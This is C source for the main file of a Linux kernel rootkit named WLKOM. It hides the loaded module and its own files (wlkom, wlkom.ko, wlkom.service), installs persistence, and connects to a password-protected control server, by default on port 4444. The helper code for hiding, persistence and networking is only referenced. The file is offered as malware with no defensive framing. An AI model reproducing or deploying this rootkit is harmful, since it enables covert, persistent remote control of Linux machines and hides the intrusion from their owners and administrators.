#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "network.h"
#include "hide.h"
#include "persist.h"

#define WLKOM_VERSION "1.0.0"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("WLKOM Team");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION(WLKOM_VERSION);

static char control_ip[64]       = "127.0.0.1";
static int  control_port         = 4444;
static char control_password[128] = "";

module_param_string(control_ip, control_ip, sizeof(control_ip), 0644);
MODULE_PARM_DESC(control_ip, "Control server IP address");

module_param(control_port, int, 0644);
MODULE_PARM_DESC(control_port, "Control server port");

module_param_string(control_password, control_password,
                    sizeof(control_password), 0400);
MODULE_PARM_DESC(control_password, "Authentication password");

static int __init wlkom_init(void)
{
    int ret;

    if (control_password[0] == '\0')
        return -EINVAL;

    ret = hide_init();
    if (ret < 0)
        return ret;

    hide_module();
    hide_file("wlkom");
    hide_file("wlkom.ko");
    hide_file("wlkom.service");

    ret = persist_init();
    if (ret < 0)
    {
        hide_exit();
        return ret;
    }

    ret = connect_init(control_ip, control_port, control_password);
    if (ret < 0)
    {
        persist_exit();
        hide_exit();
        return ret;
    }

    return 0;
}

static void __exit wlkom_exit(void)
{
    connect_exit();
    persist_exit();
    hide_exit();
}

module_init(wlkom_init);
module_exit(wlkom_exit);
